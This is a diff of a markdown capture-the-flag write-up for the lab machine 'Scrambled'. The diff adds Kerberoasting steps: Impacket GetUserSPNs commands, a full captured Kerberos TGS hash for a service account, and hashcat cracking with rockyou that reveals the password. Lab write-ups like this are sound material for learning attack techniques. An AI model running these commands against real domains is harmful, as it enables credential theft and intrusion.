@@ -2,7 +2,7 @@
 description: 10-18-22
 ---
 
-# Scrambled
+# Scrambled (Medium)
 
 <figure><img src="../../../.gitbook/assets/Scrambled.png" alt=""><figcaption></figcaption></figure>
 
@@ -116,7 +116,7 @@ Notes:
 
 Manual Zone Transfer:
 
-<figure><img src="../../../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (2) (6).png" alt=""><figcaption></figcaption></figure>
 
 * This was done in an attempt to increase our attack surface
 
@@ -181,7 +181,7 @@ Task Completed
 
 Userenum:
 
-<figure><img src="../../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (42).png" alt=""><figcaption></figcaption></figure>
 
 <mark style="color:yellow;">ksimpson is a valid user!</mark>
 
@@ -225,7 +225,7 @@ SCRAMBLECORP_ORDERS_V1.0.3;
 * After using Kerbrute to verify valid credentials, it is time to do some Kerberoasting since we now have valid credentials!
 * Here, we are simply taking advantage of the nature of the Kerberos Authentication protocol
 * If the Domain Admin had enforced stronger password requirements, it would have made our job a lot harder
-* We need to make a TGT to request a TGS from the KDC
+* This TGT will allow us to request a TGS from the KDC
 
 Kerberoasting Attempt 1:
 
@@ -248,7 +248,15 @@ Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
 ```
 
 * You can see that the TGT was saved as <mark style="color:yellow;">ksimpson.ccache</mark>
-* We can utilize <mark style="color:yellow;">klist</mark> to query information about it
+* We need to make sure that we make the TGT a variable
+
+Export KRB5CCNAME so that Impacket will use it:
+
+```
+export KRB5CCNAME=user.ccache
+```
+
+* We can now utilize <mark style="color:yellow;">klist</mark> to query information about it
 
 Klist TGT Information:
 
@@ -263,7 +271,37 @@ Valid starting       Expires              Service principal
         renew until 10/19/2022 20:07:58
 ```
 
-We need to now export the KRB5CCNAME variable so that it is identified by Impacket:
+Kerberoast:
+
+* Please download the latest version of GetUserSPNs before you do this and run that version!
+
+{% embed url="https://raw.githubusercontent.com/SecureAuthCorp/impacket/master/examples/GetUserSPNs.py" %}
+
+```
+./GetUserSPNs.py scrm.local/ksimpson:ksimpson -dc-host dc1.scrm.local -k -no-pass -request
+```
+
+Kerberos TGS Hash:
+
+```
+$krb5tgs$23$*sqlsvc$SCRM.LOCAL$scrm.local/sqlsvc*$eef70600c3b221ae7d4a62fe02be56ac$98c6c62d5cfc30a946f793282378b2e5c46a33feb629508c9c315dc9650dfd4511972982aa46e2504a503f5326381089c09f2bb5cf345f92b8ce8906541fc3bd48ce45db69194dc12c8d7a3984cfcd31df8b799f23bc614f7b838c5b9391e980147676a734d85107f4f7c99676bb8300c5212e2d2d63256ea79412fb7139c2a442cc4e43b28ed7d4514d67442df7cdac06bec3ea7353ad0dda669afeca68cba3a285f61c68257f6b865f9668d795e81080105217597796bf7d040578f79b2a4cb6ce990528f77e137a65470e4c0e5fc00510f3056e074a42bdf375c4054c1e502592fdd27f846197c9a76d681501e1aa688e47b3725d62a00ffa97447ed88993e53ef65bd89a1587c7cfa0b902388a546b2ca6559d8d12681cfaaf5f847c6ce622e56fd083dd9795870cfcdb426cd3838df36acef478cc40de07596ad99df70311b04776406e652720ada70c24770fa59dcebf035a35084f7ff25a1fe3bb65eb8adade43bbcba5ed8d8a33bb71977db6921ec497a8d8217b1f5e840c10a29a253a8a5d17c1c386dec29bc3850a050fd518ac25566dce130985511275a2f4940587e6fb0ac12320e0363eb2d0142f25374231a48670cd1c8ba0b2fc4f0d92834b10b79463802d72988cf2029bdd117b644a9144956bfab01dfea8bec6a35bd9837e0f054965e0112625cd2013be75747641b8fec984d16b98102532f8fb4dc848ecbaa2083c40f61c1f92f5f28e1610dca2b3acdb9674a4070442be8d1e8aaf6b84dae5f6a0b358a99f0ec2bd26c741a1bbce4218e55de0b3ce226cf765eb0bcd439d676831953901d9e9c97b04221726e3ca78f8d54fa59016021645b0ed776a65c6ca8336d1abfd060e6fa178940626517399ef5858665d754ff6819476a74391f340109ebedcc96d10549c1660cfe090ccbdec9d4d9b6a7566380a514420da89dbae0838e1eaec4a79c9b2aebbefbf3be076329954dffdb699538d81d4d4f0051486f7bffe6676224e0e8a56d926bb9be5a701b2632f989df3533b5ab799e217d207406082225ce22560f49d8079340db2d003bc5d120fa4e080536980922d3b258d9d8b5e4c2bf60ad5892f4e12f183fb7a4a8e7eb6514cf2df49fdc69dddf7b4d54af72b70097968e0f977f3ecb439a7161f89c65ce92dfb2a0e69e54ebc29d69c0eca5590222277d7195652ee40a4e25d09f18c09d21bfd1ff556ebe897187150da4b6355ac0c26a0bcc4efdcdef4adbf11e08be0b1234fc62aaeedb72f52e427f71d53a74bbe600498ab8505fbc801c8a94fbfa6b2ea5fda83c1e272ad86374ba86588e409a302469c6b2b2f236a0048e3c17d3269c809b8b20ebdba4f210747a4a05774f68d7df351f36d85b70ab41af15bb6a87390d3e057067a5cb12afb93768a933bfba3890bf0fd09bd028cc1738e2cf85ebfb855f8
+```
+
+Attempted to crack the Kerberos TGS hash:
+
+* I chose to utilize Windows because it has a new auto-detection mode for hashes!
+* I put the entire hash into a file called hashes.txt
+* I then chose to use the rockyou.txt wordlist
+
+Syntax:
+
+```
+.\hashcat.exe hashes.txt .\rockyou.txt --show
+```
+
+<figure><img src="../../../.gitbook/assets/image (18).png" alt=""><figcaption></figcaption></figure>
+
+* We are <mark style="color:green;">successful</mark> and get a password of <mark style="color:yellow;">Pegasus60</mark>
 
 ```
 export KRB5CCNAME=ksimpson.ccache
